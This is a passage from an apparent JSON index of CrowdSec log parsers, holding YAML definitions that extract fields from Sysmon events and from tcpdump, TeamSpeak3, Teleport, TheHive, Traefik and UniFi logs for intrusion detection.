XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='DestinationPort']\")\n      - parsed: DestinationPortName\n        expression: XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='DestinationPortName']\")\n      - meta: SysmonEventType\n        value: NetworkConnection\n  - filter: evt.Parsed.EventID == '4'\n    statics:\n      - parsed: State\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='State']\")\n      - parsed: Version\n        expression: XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='Version']\")\n      - parsed: SchemaVersion\n        expression: XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='SchemaVersion']\")\n      - meta: SysmonEventType\n        value: SysmonServiceStateChanged\n  - filter: evt.Parsed.EventID == '5'\n    statics:\n      - parsed: ProcessGuid\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='ProcessGuid']\")\n      - parsed: Image\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='Image']\")\n      - parsed: ProcessId\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='ProcessId']\")\n      - meta: SysmonEventType\n        value: ProcessTerminated\n  - filter: evt.Parsed.EventID == '6'\n    statics:\n      - parsed: ImageLoaded\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='ImageLoaded']\")\n      - parsed: Hashes\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='Hashes']\")\n      - parsed: Signed\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='Signed']\")\n      - parsed: Signature\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='Signature']\")\n      - parsed: SignatureStatus\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='SignatureStatus']\")\n      - meta: SysmonEventType\n        value: DriverLoaded\n  - filter: evt.Parsed.EventID == '7'\n    statics:\n      - parsed: ProcessGuid\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='ProcessGuid']\")\n      - parsed: ProcessId\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='ProcessId']\")\n      - parsed: Image\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='Image']\")\n      - parsed: ImageLoaded\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='ImageLoaded']\")\n      - parsed: Hashes\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='Hashes']\")\n      - parsed: Signed\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='Signed']\")\n      - parsed: Signature\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='Signature']\")\n      - parsed: SignatureStatus\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='SignatureStatus']\")\n      - meta: SysmonEventType\n        value: ImageLoaded\n  - filter: evt.Parsed.EventID == '8'\n    statics:\n      - parsed: SourceProcessGuid\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='SourceProcessGuid']\")\n      - parsed: SourceProcessId\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='SourceProcessId']\")\n      - parsed: SourceImage\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='SourceImage']\")\n      - parsed: TargetProcessGuid\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='TargetProcessGuid']\")\n      - parsed: TargetProcessId\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='TargetProcessId']\")\n      - parsed: TargetImage\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='TargetImage']\")\n      - parsed: NewThreadId\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='NewThreadId']\")\n      - parsed: StartAddress\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='StartAddress']\")\n      - parsed: StartModule\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='StartModule']\")\n      - parsed: StartFunction\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='StartFunction']\")\n      - meta: SysmonEventType\n        value: CreateRemoteThread\n  - filter: evt.Parsed.EventID == '9'\n    statics:\n      - parsed: ProcessGuid\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='ProcessGuid']\")\n      - parsed: ProcessId\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='ProcessId']\")\n      - parsed: Image\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='Image']\")\n      - parsed: Device\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='Device']\")\n      - meta: SysmonEventType\n        value: RawAccessRead\n  - filter: evt.Parsed.EventID == '10'\n    statics:\n      - parsed: SourceProcessGUID\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='SourceProcessGUID']\")\n      - parsed: SourceProcessId\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='SourceProcessId']\")\n      - parsed: SourceThreadId\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='SourceThreadId']\")\n      - parsed: SourceImage\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='SourceImage']\")\n      - parsed: TargetProcessGUID\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='TargetProcessGUID']\")\n      - parsed: TargetProcessId\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='TargetProcessId']\")\n      - parsed: TargetImage\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='TargetImage']\")\n      - parsed: GrantedAccess\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='GrantedAccess']\")\n      - parsed: CallTrace\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='CallTrace']\")\n      - meta: SysmonEventType\n        value: ProcessAccess\n  - filter: evt.Parsed.EventID == '11'\n    statics:\n      - parsed: ProcessGuid\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='ProcessGuid']\")\n      - parsed: ProcessId\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='ProcessId']\")\n      - parsed: Image\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='Image']\")\n      - parsed: TargetFilename\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='TargetFilename']\")\n      - parsed: CreationUtcTime\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='CreationUtcTime']\")\n      - meta: SysmonEventType\n        value: FileCreate\n  - filter: evt.Parsed.EventID == '12'\n    statics:\n      - parsed: EventType\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='EventType']\")\n      - parsed: ProcessGuid\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='ProcessGuid']\")\n      - parsed: ProcessId\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='ProcessId']\")\n      - parsed: Image\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='Image']\")\n      - parsed: TargetObject\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='TargetObject']\")\n      - meta: SysmonEventType\n        value: RegistryCreateOrDel\n  - filter: evt.Parsed.EventID == '13'\n    statics:\n      - parsed: EventType\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='EventType']\")\n      - parsed: ProcessGuid\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='ProcessGuid']\")\n      - parsed: ProcessId\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='ProcessId']\")\n      - parsed: Image\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='Image']\")\n      - parsed: TargetObject\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='TargetObject']\")\n      - parsed: Details\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='Details']\")\n      - meta: SysmonEventType\n        value: RegistrySetValue\n  - filter: evt.Parsed.EventID == '14'\n    statics:\n      - parsed: EventType\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='EventType']\")\n      - parsed: ProcessGuid\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='ProcessGuid']\")\n      - parsed: ProcessId\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='ProcessId']\")\n      - parsed: Image\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='Image']\")\n      - parsed: TargetObject\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='TargetObject']\")\n      - parsed: NewName\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='NewName']\")\n      - meta: SysmonEventType\n        value: RegistryRename\n  - filter: evt.Parsed.EventID == '15'\n    statics:\n      - parsed: ProcessGuid\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='ProcessGuid']\")\n      - parsed: ProcessId\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='ProcessId']\")\n      - parsed: Image\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='Image']\")\n      - parsed: TargetFilename\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='TargetFilename']\")\n      - parsed: CreationUtcTime\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='CreationUtcTime']\")\n      - meta: SysmonEventType\n        value: FileCreateStreamHash\n  - filter: evt.Parsed.EventID == '16'\n    statics:\n      - parsed: ConfigurationFileHash\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='ConfigurationFileHash']\")\n      - parsed: Configuration\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='Configuration']\")\n      - meta: SysmonEventType\n        value: SysmonConfigChange\n  - filter: evt.Parsed.EventID == '17'\n    statics:\n      - parsed: ProcessGuid\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='ProcessGuid']\")\n      - parsed: ProcessId\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='ProcessId']\")\n      - parsed: Image\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='Image']\")\n      - parsed: PipeName\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='PipeName']\")\n      - meta: SysmonEventType\n        value: PipeCreated\n  - filter: evt.Parsed.EventID == '18'\n    statics:\n      - parsed: ProcessGuid\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='ProcessGuid']\")\n      - parsed: ProcessId\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='ProcessId']\")\n      - parsed: Image\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='Image']\")\n      - parsed: PipeName\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='PipeName']\")\n      - meta: SysmonEventType\n        value: PipeConnected\n  - filter: evt.Parsed.EventID == '19'\n    statics:\n      - parsed: EventType\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='EventType']\")\n      - parsed: Operation\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='Operation']\")\n      - parsed: User\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='User']\")\n      - parsed: EventNamespace\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='EventNamespace']\")\n      - parsed: Name\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='Name']\")\n      - parsed: Query\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='Query']\")\n      - meta: SysmonEventType\n        value: WmiEventFilter\n  - filter: evt.Parsed.EventID == '20'\n    statics:\n      - parsed: EventType\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='EventType']\")\n      - parsed: Operation\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='Operation']\")\n      - parsed: User\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='User']\")\n      - parsed: Type\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='Type']\")\n      - parsed: Name\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='Name']\")\n      - parsed: Destination\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='Destination']\")\n      - meta: SysmonEventType\n        value: WmiEventConsumer\n  - filter: evt.Parsed.EventID == '21'\n    statics:\n      - parsed: EventType\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='EventType']\")\n      - parsed: Operation\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='Operation']\")\n      - parsed: User\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='User']\")\n      - parsed: Consumer\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='Consumer']\")\n      - parsed: Filter\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='Filter']\")\n      - meta: SysmonEventType\n        value: WmiEventConsumerToFilter\n  - filter: evt.Parsed.EventID == '22'\n    statics:\n      - parsed: ProcessGuid\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='ProcessGuid']\")\n      - parsed: ProcessId\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='ProcessId']\")\n      - parsed: QueryName\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='QueryName']\")\n      - parsed: QueryStatus\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='QueryStatus']\")\n      - parsed: QueryResults\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='QueryResults']\")\n      - parsed: Image\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='Image']\")\n      - meta: SysmonEventType\n        value: DNSEvent\n  - filter: evt.Parsed.EventID == '23'\n    statics:\n      - parsed: ProcessGuid\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='ProcessGuid']\")\n      - parsed: ProcessId\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='ProcessId']\")\n      - parsed: User\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='User']\")\n      - parsed: Image\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='Image']\")\n      - parsed: TargetFilename\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='TargetFilename']\")\n      - parsed: Hashes\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='Hashes']\")\n      - parsed: IsExecutable\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='IsExecutable']\")\n      - parsed: Archived\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='Archived']\")\n      - meta: SysmonEventType\n        value: FileDelete\n  - filter: evt.Parsed.EventID == '24'\n    statics:\n      - parsed: ProcessGuid\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='ProcessGuid']\")\n      - parsed: ProcessId\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='ProcessId']\")\n      - parsed: User\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='User']\")\n      - parsed: Image\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='Image']\")\n      - parsed: Session\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='Session']\")\n      - parsed: ClientInfo\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='ClientInfo']\")\n      - parsed: Hashes\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='Hashes']\")\n      - parsed: IsExecutable\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='IsExecutable']\")\n      - parsed: Archived\n        expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='Archived']\")\n      - meta: SysmonEventType\n        value: ClipboardChange\n  - filter: evt.Parsed.EventID == '225'\n    statics:\n      - meta: SysmonEventType\n        value: SysmonInternalError\n\nstatics:\n  - meta: service\n    value: sysmon\n  - meta: RuleName\n    expression:  XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='RuleName']\")", "description": "Parse sysmon events", "path": "parsers/s01-parse/crowdsecurity/sysmon-logs.yaml", "stage": "s01-parse", "version": "0.2", "versions": {"0.1": {"digest": "6a349cea36ce2cb571d545767c4eab9279179ef7d26f01644e2b746ea68638f1"}, "0.2": {"digest": "3dbf095ad6040613ccfba1631f06d55ab0c854c3f96f18dcd3bda5c0d3632186"}}}, "crowdsecurity/tcpdump-logs": {"content": "onsuccess: next_stage\nfilter: \"evt.Parsed.program == 'tcpdump'\"\nname: crowdsecurity/tcpdump-logs\n#debug: true\ndescription: \"Parse tcpdump raw logs\"\ngrok:\n  name: \"TCPDUMP_OUTPUT\"\n  apply_on: message\nstatics:\n    - meta: service\n      value: tcp\n    - meta: log_type\n      value: tcp_syn\n    - meta: source_ip\n      expression: \"evt.Parsed.source_ip\"\n    - meta: dest_ip\n      expression: \"evt.Parsed.dest_ip\"\n    - meta: dest_port\n      expression: \"evt.Parsed.dest_port\"\n    - parsed: \"new_connection\"\n      expression: \"evt.Parsed.tcpflags contains 'S' ? 'true' : 'false'\"", "description": "Parse tcpdump raw logs", "path": "parsers/s01-parse/crowdsecurity/tcpdump-logs.yaml", "stage": "s01-parse", "version": "0.1", "versions": {"0.1": {"digest": "e51892c14d137cc4f12d2203c851a953e743f262561c48ff6108bd4222fff254"}}}, "crowdsecurity/teamspeak3-logs": {"content": "onsuccess: next_stage\nfilter: \"evt.Parsed.program == 'ts3'\"\nname: crowdsecurity/teamspeak3-logs\n#debug: true\ndescription: \"Parse teamspeak3 server logs\"\npattern_syntax:\n  NOPIPE: '[a-zA-Z\\s]+'\n  TS3_AUTH_FAIL: '^%{TIMESTAMP_ISO8601:timestamp}\\|%{NOPIPE:level}\\|%{NOPIPE:service}\\|%{NOPIPE:empty}\\|query from %{INT:chan} \\[?%{IP:src_ip}\\]?:%{INT:src_port} attempted to login with account \"%{DATA:login}\" and failed!$'\n#2022-12-29 11:39:26.009756|INFO    |Query         |   |query from 11 127.0.0.1:48426 attempted to login with account \"toto\" and failed!\n#2023-01-13 00:44:27.543333|INFO    |Query         |   |query from 101 [fd00:feed:dead:beef:405f:26ff:fe06:d4b]:34232 attempted to login with account \"toto\" and failed!\n\ngrok:\n  name: TS3_AUTH_FAIL\n  apply_on: message\n  statics:\n    - meta: service\n      value: teamspeak3\n    - meta: log_type\n      value: ts3_fail_auth\n    - meta: source_ip\n      expression: \"evt.Parsed.src_ip\"\n    - target: evt.StrTime\n      expression: evt.Parsed.timestamp\n", "description": "Parse teamspeak3 server logs", "path": "parsers/s01-parse/crowdsecurity/teamspeak3-logs.yaml", "stage": "s01-parse", "version": "0.2", "versions": {"0.1": {"digest": "ad06951c76f4f270e7c15325011735c715e476a3c1edb8aba086b05b0c86970f"}, "0.2": {"digest": "255a289431812be0e9ff76638dfea59e1c8c6512137db367ac40c51b43d32eb2"}}}, "crowdsecurity/teleport-logs": {"content": "name: crowdsecurity/teleport-logs\ndescription: \"Parse teleport logs\"\nfilter: \"evt.Parsed.program == 'teleport' && UnmarshalJSON(evt.Parsed.message, evt.Unmarshaled, 'teleport') in ['', nil]\"\n#debug: true\nonsuccess: next_stage\nstatics:\n  - meta: service\n    value: teleport\n  - meta: sub_type\n    expression: evt.Unmarshaled.teleport.event\n  - meta: success\n    expression: \"evt.Unmarshaled.teleport.success ? 'true' : 'false'\"\n## Set for impossible travel scenario\n  - meta: log_type\n    expression: \"evt.Unmarshaled.teleport.success ? 'auth_success' : 'auth_failed'\"\n##Converting a bool with sprintf is very slow, so we use a ternary expression\n  - target: evt.StrTime\n    expression: evt.Unmarshaled.teleport.time\n  - meta: user\n    expression: evt.Unmarshaled.teleport.user\n  - meta: source_ip\n    expression: Split(evt.Unmarshaled.teleport[\"addr.remote\"], ':')[0]\n  - meta: http_user_agent\n    expression: evt.Unmarshaled.teleport[\"user_agent\"]", "description": "Parse teleport logs", "path": "parsers/s01-parse/crowdsecurity/teleport-logs.yaml", "stage": "s01-parse", "version": "0.1", "versions": {"0.1": {"digest": "3fbeaceed0ed03d0a23244c6c3cf3774aa69e9bbf3c77638e5cfb3532ddd67b2"}}}, "crowdsecurity/thehive-logs": {"content": "onsuccess: next_stage\nname: crowdsecurity/thehive-logs\ndescription: \"Parse Thehive logs\"\nfilter: \"evt.Parsed.program == 'thehive'\"\nnodes:\n  - grok:\n      pattern: '\\[info\\] o.t.s.AccessLogFilter \\[.*\\] %{IP:source_ip} POST /api/v1/login took %{INT}ms and returned 401 %{INT} bytes'\n      apply_on: message\nstatics:\n  - meta: log_type\n    value: thehive_failed_auth\n  - meta: source_ip\n    expression: \"evt.Parsed.source_ip\"\n  - target: evt.StrTime\n    value: toto", "description": "Parse Thehive logs", "path": "parsers/s01-parse/crowdsecurity/thehive-logs.yaml", "stage": "s01-parse", "version": "0.1", "versions": {"0.1": {"digest": "777997fbca7b59c7cd67a890e298ff8cbc648013a8e9db484ec1754318b3e389"}}}, "crowdsecurity/traefik-logs": {"content": "# co-authored with gmelodie (https://github.com/gmelodie)\nname: crowdsecurity/traefik-logs\ndescription: \"Parse Traefik access logs\"\nfilter: \"evt.Parsed.program startsWith 'traefik'\"\n#debug: true\nonsuccess: next_stage\npattern_syntax:\n  TRAEFIK_ROUTER: '(%{USER}@%{URIHOST}|\\-)'\n  TRAEFIK_SERVER_URL: '(%{URI}|\\-)'\n  NUMBER_MINUS: '[0-9-]+'\n  NGCUSTOMUSER: '[a-zA-Z0-9\\.\\@\\-\\+_%]+'\n  NGINXACCESS2: '%{IPORHOST:remote_addr} - %{NGCUSTOMUSER:remote_user} \\[%{HTTPDATE:time_local}\\] \"%{WORD:verb} %{DATA:request} HTTP/%{NUMBER:http_version}\" %{NUMBER_MINUS:status} %{NUMBER_MINUS:body_bytes_sent} \"%{NOTDQUOTE:http_referer}\" \"%{NOTDQUOTE:http_user_agent}\"'\nnodes:\n  - grok: # CLF parser\n      pattern: '%{NGINXACCESS2} %{NUMBER:number_of_requests_received_since_traefik_started} \"%{TRAEFIK_ROUTER:traefik_router_name}\" \"%{TRAEFIK_SERVER_URL:traefik_server_url}\" %{NUMBER:request_duration_in_ms}ms'\n      apply_on: message\n# We must use evt.Parsed.message to make sure we respect s00 stage\n  - filter: TrimSpace(evt.Parsed.message) startsWith \"{\" && UnmarshalJSON(evt.Parsed.message, evt.Unmarshaled, \"traefik\") in [\"\", nil]\n    statics:\n      - parsed: remote_addr\n        expression: evt.Unmarshaled.traefik.ClientHost\n      - parsed: dest_addr\n        ## Split dest_addr to get IP only as this is original functionality\n        expression: Split(evt.Unmarshaled.traefik.ClientAddr, ':')[0]\n      - parsed: request_addr\n        expression: evt.Unmarshaled.traefik.RequestAddr\n      - parsed: service_addr\n        ## Split service_addr to get IP only as this is original functionality\n        expression: \"evt.Unmarshaled.traefik.ServiceAddr != nil ? Split(evt.Unmarshaled.traefik.ServiceAddr, ':')[0] : nil\"\n      - parsed: http_user_agent\n        expression: evt.Unmarshaled.traefik[\"request_User-Agent\"] ## We have to access via [] as the key contains a dash \n      - parsed: body_bytes_sent\n        ## We have to check if DownstreamContentSize is nil, as it will cause EXPR error if it is \n        expression: \"evt.Unmarshaled.traefik.DownstreamContentSize != nil ? int(evt.Unmarshaled.traefik.DownstreamContentSize) : nil\"\n      - parsed: request_duration_in_ms\n        expression: int(evt.Unmarshaled.traefik.Duration)\n      - parsed: traefik_router_name\n        expression: evt.Unmarshaled.traefik.RouterName\n      - parsed: time_local\n        expression: evt.Unmarshaled.traefik.time\n      - parsed: verb\n        expression: evt.Unmarshaled.traefik.RequestMethod\n      - parsed: request\n        expression: evt.Unmarshaled.traefik.RequestPath\n      - parsed: http_version\n        ## Split http_version to get version only as this is original functionality\n        expression: Split(evt.Unmarshaled.traefik.RequestProtocol, '/')[1]\n      - parsed: status\n        expression: int(evt.Unmarshaled.traefik.DownstreamStatus)\n      - meta: target_fqdn\n        expression: \"evt.Unmarshaled.traefik.RequestHost != nil ? evt.Unmarshaled.traefik.RequestHost : ''\"\nstatics:\n  - meta: service\n    value: http\n  - meta: http_status\n    expression: \"evt.Parsed.status\"\n  - meta: http_path\n    expression: \"evt.Parsed.request\"\n  - meta: user\n    expression: \"evt.Parsed.remote_user\"\n  - meta: source_ip\n    expression: \"evt.Parsed.remote_addr\"\n  - meta: http_user_agent\n    expression: \"evt.Parsed.http_user_agent\"\n  - meta: log_type\n    value: http_access-log\n  - target: evt.StrTime\n    expression: \"evt.Parsed.time_local\"\n  - meta: traefik_router_name\n    expression: \"evt.Parsed.traefik_router_name\"\n  - meta: http_verb\n    expression: \"evt.Parsed.verb\"\n", "description": "Parse Traefik access logs", "path": "parsers/s01-parse/crowdsecurity/traefik-logs.yaml", "stage": "s01-parse", "version": "1.2", "versions": {"0.1": {"digest": "3dcf2e166ad138a69d009bfd364e30dee50debc5ed882ed9d8bbf52f2509c600"}, "0.2": {"digest": "a461c760c7a669f5c7aab35587c65f0b08b145002ff77f4907e0b94d997b32c8"}, "0.3": {"digest": "e7691b4dddb010d87945c12753ce6e5c9da4d069694227000b0cc6cdf66f4810"}, "0.4": {"digest": "36eed0ae5e3fdf0a59538f0af2262311cadc81d7d5c9fba9051cf69c41cd3533"}, "0.5": {"digest": "5b2ad9def31d7314a701a8f3be0f7e80e15a036dc0d13ab2bd45cf04eb30a121"}, "0.6": {"digest": "e200a068b6781f26f9ce07e20e0e7d74ebb63c8977fa1f6a2618d1a05f71624e"}, "0.7": {"digest": "b2ff5d3441d12d72c50af05dd8208f2359b30bb8f96aa18760f35c46fb1859da"}, "0.8": {"digest": "573d81db95901f40f3150e651696dff2c236b6ad2b4fca81f6b550b415466439"}, "0.9": {"digest": "0b3eb296548ee739a7665ddbbc62e36163e1f347b7dc2595f1d955731d5c7336"}, "1.0": {"digest": "d77813af79b68bf28fd0c8c4520577944ac7d45d18be81070163ac21b98d1733"}, "1.1": {"digest": "d6f62e97328d92d4c61b69404b072402216bb35a1e044f9f9ffde2425ee5397f"}, "1.2": {"digest": "4eabc1fb723f842f624106be44f3fb971e49198505ff2be1417710d31bde2699"}}}, "crowdsecurity/unifi-logs": {"content": "filter: \"evt.Line.Labels.type == 'unifi'\"\nonsuccess: next_stage\npattern_syntax:\n  ACTION: (D|R|A)\n  ZONE: (LAN|WAN|LOCAL|VPN|DMZ)\n  IFACE_OR_EMPTY: (?:[a-zA-Z]+[0-9]*|)\n  UNIFI_HOSTNAME: '(?:%{DATA:hostname},%{DATA:mac_address},%{DATA:firmware_version}|%{DATA:hostname})'\n  UNIFI_FIREWALL_PREFIX: '(?:\\[WAN_%{ZONE:dst_zone}-%{ACTION:action}-%{INT:rule_id}\\] ?)?'\n  SYSLOGBASE_UNIFI: 